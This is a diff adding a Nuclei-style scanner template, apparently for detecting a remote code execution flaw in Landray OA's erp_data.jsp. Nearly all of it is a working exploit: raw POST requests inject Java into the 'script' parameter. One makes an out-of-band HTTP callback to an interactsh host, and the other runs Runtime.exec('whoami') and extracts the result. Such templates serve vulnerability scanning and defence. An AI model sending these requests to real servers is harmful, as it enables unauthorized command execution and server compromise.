@@ -1,0 +1,47 @@
+id: landray-oa-erp-data-rce
+info:
+  name: Landray OA erp_data.jsp sysFormulaValidate Method RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Landray OA erp_data.jsp has security vulnerabilities that allow attackers to execute arbitrary script code, potentially compromising server permissions.
+  reference:
+    - https://mp.weixin.qq.com/s/0xu7K726hp1xfnShhjGbVQ
+  tags: rce, oa
+http:
+  - raw:
+      - |
+        POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        var={"body":{"file":"/tic/core/resource/js/erp_data.jsp"}}&erpServcieName=sysFormulaValidate&script=HttpURLConnection connection = (HttpURLConnection)(new URL("{{interactsh-url}}"));connection.setRequestMethod("GET");connection.getResponseCode();
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '[{"message":"'
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - '\[{"message":"(.*?)"\]'
+  - raw:
+      - |
+        POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        var={"body":{"file":"/tic/core/resource/js/erp_data.jsp"}}&erpServcieName=sysFormulaValidate&script={{javaCode}}
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - '\[{"message":"(.*?)"\]'
+variables:
+  javaCode: 'Runtime.getRuntime().exec("whoami");'
